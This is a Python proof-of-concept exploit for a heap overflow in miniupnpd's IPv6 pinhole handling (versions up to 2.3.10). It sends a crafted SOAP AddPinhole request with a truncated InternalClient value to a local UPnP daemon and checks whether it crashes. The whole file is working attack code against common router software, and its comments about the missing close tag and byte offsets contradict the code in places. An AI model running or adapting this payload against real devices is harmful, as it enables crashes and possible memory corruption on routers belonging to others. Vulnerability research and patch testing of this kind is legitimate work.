#!/usr/bin/env python3
# miniupnpd PinholeVerification() heap overflow — <= 2.3.10 (fix b24d595, released 2026-08-12)
# inet_ntop(AF_INET6, &result_ip, int_ip, sizeof(struct in6_addr)) writes up to 46B
# into the request buffer at the InternalClient value position.
# Value "x" near the buffer end -> write past heap chunk -> ASAN heap-buffer-overflow.
import socket

BODY = (
    '<?xml version="1.0"?>'
    '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
    '<s:Body>'
    '<u:AddPinhole xmlns:u="urn:schemas-upnp-org:service:WANIPv6FirewallControl:1">'
    '<RemoteHost>1.2.3.4</RemoteHost><RemotePort>53</RemotePort><InternalPort>53</InternalPort>'
    '<Protocol>17</Protocol><LeaseTime>3600</LeaseTime>'
    '<InternalClient>x</>'
    # no close tag at all: value sits at EOF -> 16B inet_ntop write past chunk end -> value sits 17B from chunk end
).encode()

req = (
    "POST /ctl/IP6FCtl HTTP/1.1\r\n"
    "Host: 127.0.0.1:5555\r\n"
    'Content-Type: text/xml; charset="utf-8"\r\n'
    'SOAPAction: "urn:schemas-upnp-org:service:WANIPv6FirewallControl:1#AddPinhole"\r\n'
    f"Content-Length: {len(BODY)}\r\n\r\n"
).encode() + BODY

print(f"[*] sending {len(req)}B SOAP AddPinhole, InternalClient=x (last arg)")
s = socket.create_connection(("127.0.0.1", 5555), timeout=5)
s.sendall(req)
try:
    print("[*] resp:", s.recv(512).decode(errors="replace").split("\r\n")[0])
except Exception as e:
    print("[*] no response (daemon crashed?):", e)
